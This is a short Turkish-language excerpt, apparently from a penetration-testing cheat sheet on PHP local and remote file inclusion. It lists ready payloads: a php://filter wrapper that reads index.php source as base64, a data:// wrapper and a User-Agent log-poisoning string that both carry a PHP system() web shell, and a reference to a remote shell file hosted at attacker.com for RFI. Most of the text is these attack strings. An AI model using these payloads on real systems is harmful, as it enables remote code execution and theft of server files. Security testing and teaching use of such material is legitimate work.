...
RFI (Remote File Inclusion): Uzak bir sunucudan kod/dosya dahil ettirilmesi (genelde allow_url_include açıkken).
...
Base64 ile dosya içeriği okuma:

* `php://filter/convert.base64-encode/resource=index.php`

Data wrapper ile RCE (allow_url_include açıksa):

* `data://text/plain,<?php system($_GET['cmd']); ?>`

PHP input ile RCE (POST body kullanır):
...
User-Agent header'a PHP payload enjekte et:

* `<?php system($_GET['cmd']); ?>`

LFI ile log dosyasını include ettir:
...
attacker.com/shell.txt içeriği:
